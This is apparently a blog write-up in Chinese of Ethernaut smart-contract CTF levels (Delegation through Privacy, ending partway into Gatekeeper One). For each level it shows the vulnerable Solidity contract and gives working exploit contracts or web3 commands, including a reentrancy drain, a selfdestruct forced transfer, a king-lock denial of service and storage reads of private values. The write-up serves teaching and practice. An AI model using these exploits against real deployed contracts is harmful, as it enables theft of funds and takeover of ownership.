<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Delegation</code>调用了<code>Delegate</code>合约，在<code>fallback</code>函数中使用了<code>delegatecall</code></p>
<p>Solodity中支持两种底层调用方式<code>call</code>和<code>delegatecall</code>，其中<code>call</code>外部调用时，上下文是外部合约，而<code>delegatecall</code>外部调用时，上下文是调用合约</p>
<p>即可以通过<code>address(delegate).delegatecall(msg.data)</code>调用<code>delegate</code>中的任意函数，其中只需要调用<code>pwn</code>函数即可成为owner</p>
<p>可以通过method id（函数选择器）来调用函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>: web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>)&#125;).<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
<p>要求合约中余额大于0，直接转账失败</p>
<p>一个智能合约如何接收ETH？三个方法</p>
<ul>
<li>通过一个有<code>payable</code>修饰器的函数</li>
<li>分配合约地址作为挖矿奖励的接收</li>
<li>通过<code>receive()</code>fallback方法</li>
</ul>
<blockquote>
<p>A contract without a receive Ether function can receive Ether […] as a destination of a selfdestruct. A contract cannot react to such Ether transfers and thus also cannot reject them.</p>
</blockquote>
<p>一个没有接收Ether函数的合约可以接收Ether作为<code>selfdestruct</code>的目的地。合约不能对这样的Ether转移作出反应，因此也不能拒绝</p>
<p><code>selfdestruct(address)</code>函数删除合约中的所有字节码并发送所有储存的Ether到指定地址。如果该地址也是一个合约，则不会调用任何函数（包括fallback）</p>
<p>所以<code>selfdestruct()</code>是一个智能合约接收ETH的第四个方法</p>
<p>回到本题原合约什么都没有，目标要余额大于0，所以考虑使用<code>selfdestruct</code>强行转账进去</p>
<p>exp如下，需要实现向攻击合约中转账，可以在remix上选择1wei然后部署</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() payable public &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () payable public &#123;</span><br><span class="line">        selfdestruct(0xa87Bc5F4cB0Fd445615E377Eb319Ce28001B08f9);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(instance);</span><br><span class="line"><span class="string">&#x27;0.000000000000000001&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>password是私有变量，然后私有变量只能阻止其他合约访问，无法阻止公开访问，链上的数据是公开的。按照代码password存储位置是1，可以用下面命令获取到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>然后提交即可<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>谁给的钱多谁就能成为King，前任King的钱会归还，解题需要使自己成为king并阻止别人成为king</p>
<p>solidity中几种转币的方式</p>
<ul>
<li><code>&lt;address&gt;.transfer()</code> 发送失败会<code>throw</code>，回滚状态；只会传递部分Gas供调用，防止重入</li>
<li><code>&lt;address&gt;.send()</code>发送失败时会返回false；只会传递部分Gas供调用，防止冲入</li>
<li><code>&lt;address&gt;.call.value()()</code>发送失败会返回false；传递所有可用Gas供调用，不能有效防止重入</li>
</ul>
<p>当成为King后，如果有人打的钱更多，就会先把钱退给我们，这里使用的是<code>transfer()</code>。前面提到如果<code>transfer()</code>调用失败会回滚状态，所以如果合约在退钱这一步一直调用失败的话，代码就无法继续向下运行，也就组织了其他人成为新的king</p>
<p>exp如下（参考），没有fallback和receive会退还<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    constructor(address target) public payable&#123;</span><br><span class="line">        target.call.gas(1000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>题目给的源码有点小问题，参照<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66388642/solidity-parsererror-expected-but-got">https://stackoverflow.com/questions/66388642/solidity-parsererror-expected-but-got</a> 更改编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call.value(_amount)(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本题考察重入攻击</p>
<p>重入攻击发生在单线程计算环境，当执行栈在返回原执行过程前发生跳转或子程序调用</p>
<p>一方面，单线程执行确保了合约的原子性并消除了一些条件竞争，另一方面，合约容易因为不良执行顺序变得易被攻击</p>
<p>一个典型的例子就是先转账再扣钱</p>
<p><img src="https://img1.imgtp.com/2022/09/09/zWKRpFC2.png" alt="1662704709136.png"></p>
<p>上面例子里，合约B是一个递归调用<code>A.withdraw()</code>来耗尽A的资金的恶意合约。注意合约A再其递归循环返回之前，资金提取就已经完成，同时合约B将提取超过自身金额</p>
<p>结束条件</p>
<ul>
<li>合约余额不足以给我们的合约转账时</li>
<li>本次调用的gas达到上限 Gas Limit</li>
</ul>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">  uint public amount = 0.001 ether;</span><br><span class="line">  Reentrance public re;</span><br><span class="line">  constructor (address payable target) public payable&#123;</span><br><span class="line">    re = Reentrance(target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function exp() public &#123;</span><br><span class="line">    re.donate.value(amount)(address(this));</span><br><span class="line">    re.withdraw(amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fallback () payable external &#123;</span><br><span class="line">    if(address(re).balance &gt;= 0)&#123;</span><br><span class="line">      re.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再补充点修复的方法</p>
<ul>
<li>指定gas费率，依次转账消耗21000gas，可能存在其他操作所以可以限制gas23000，预留一部分gas</li>
<li>使用其他转账函数</li>
</ul>
<p><code>send address.send(uint256 amount) returns (bool)</code>，``</p>
<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>solidity函数具有在每次函数调用开始时执行的函数修饰符</p>
<p>和<code>public</code>、<code>private</code>类似，<code>pure</code>和<code>view</code>都是内建的状态修饰符，他们“承诺”函数如何和与以太坊区块链上的数据交互</p>
<ul>
<li><code>pure</code>：承诺既不读取也不修改状态的函数。注意在最近的编译器中<code>pure</code>代替了<code>constant</code></li>
<li><code>view</code>：承诺只读取但不修改状态的函数</li>
<li><code>default</code>：[无修饰符]承诺将读取和修改状态的函数</li>
</ul>
<p>在早期编译器版本中，当函数违背其修饰符的承诺时，编译器会允许并不会给出警告，所以一个<code>pure</code>修饰的函数可以违背承诺来修改函数状态，并没有任何警告</p>
<p><strong>接口</strong>允许不同的合约类相互交互</p>
<p>可以将接口看作ABI声明，强制所有合约以相同语言/数据结构下交互。但是接口没有规定函数内部的逻辑，让开发人员实现自己的业务层</p>
<p>合约接口指定是什么，而不是如何</p>
<p>开发人员通常使用接口：</p>
<ul>
<li>设计合约：通过在实现真正的合约前先生成一个工作ABI</li>
<li>代币合约：声明一种共享的语言，所以不同合约可以使用这些代币来处理他们的业务逻辑</li>
<li>未使用：一些开发人员想完全抛弃接口，转而使用抽象类</li>
</ul>
<blockquote>
<p>注意抽象类和接口一样有类似的安全漏洞，在抽象类合约中一些函数已经被编程，但可以轻易地被重写</p>
</blockquote>
<p>要登顶，需要<code>top=true</code>，则if的条件<code>building.isLastFloor(_floor)</code>要返回false，而<code>building.isLastFloor(floor)</code>要返回true</p>
<p>注意到合约在接口中没有实现该函数</p>
<p>这意味着我们可以创建一个并实现<code>isLastFloor</code>函数的恶意合约，然后在恶意合约中调用<code>goTo</code>函数，我们实现的<code>isLastFloor</code>函数将在题目合约实例中被调用</p>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  Elevator public e = Elevator(0x8117C9B8AcbeAbaF19305771d147ACC77508Cf6D);</span><br><span class="line">  bool public flag = true;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) view public returns (bool) &#123;</span><br><span class="line">    if(flag)&#123;</span><br><span class="line">      flag = false;</span><br><span class="line">      return flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      flag = true;</span><br><span class="line">      return flag;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    e.goTo(1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题和之前的<code>Vault</code>类似，只需要通过存储地址拿到值即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000631cb873&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000b873ff0a&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">3</span>)</span><br><span class="line"><span class="string">&#x27;0xf17d08e6e57b89109ecbfaa4ad8f4fa41e6bbea7fcaa854edb529869c74a21b9&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;0xd00fb83642061b81555fcda7d124480420082d02ee499522a797ff2a4337454c&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;0xbf404def7311f425f1a507c9bd8d217363cb412df26f686c76ebd4cfe999bc78&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">6</span>)</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>题目所需的<code>bytes16(data[2])</code>是就是<code>byte32 data[2]</code>的前16个字节，注意这里强制转换截取是从高往低截的</p>
<p>调用一下函数传过去即可<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0xbf404def7311f425f1a507c9bd8d2173&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察如何计算gas</p>
<p>可以看到想要进入<code>enter</code>需要满足三个条件</p>
<ul>
<li><code>gateone</code>：<code>msg.sender != tx.origin</code>，这个之前做过，只需要通过一个合约来调用题目合约的函数，则<code>tx.origin</code>是自己的地址，<code>msg.sender</code>是外部合约的地址</li>
<li><code>gatetwo</code>：需要剩余的gas%8191为0，考察gas的计算</li>
<li><code>gatethree</code>真对gatekey进行数据类型转换要求满足几个条件</li>
</ul>
<p>首先看<code>gatetwo</code></p>
<p>在以太坊中，计算要花钱。这是通过<code>gas * gas price</code>计算的，其中<code>gas</code>是一个计算单位，<code>gas price</code>随着以太坊网络的负载而变化，交易发送者需要为发起的每笔交易支付所产生的以太币。</p>
<blockquote>
<p>复杂的合约（比如创建合约）要比简单合约（发送以太币）消耗更大。存储数据到区块链比读取数据消耗更大，同时读取常量比读取存储值的消耗小</p>
</blockquote>
<p>特别地，<code>gas</code>是在汇编层面分配的。也即每次调用栈上发生操作。例如，这里是一些算数运算和它们目前消耗的gas（源自以太坊黄页 Ethereum Yellow Paper 附录H）</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vODblD"><img src="https://s1.ax1x.com/2022/09/11/vODblD.png" alt="vODblD.png"></a></p>
<p>$ \delta $：从栈移除的gas；$ \alpha $：加入栈的gas</p>
<p>代码</p>
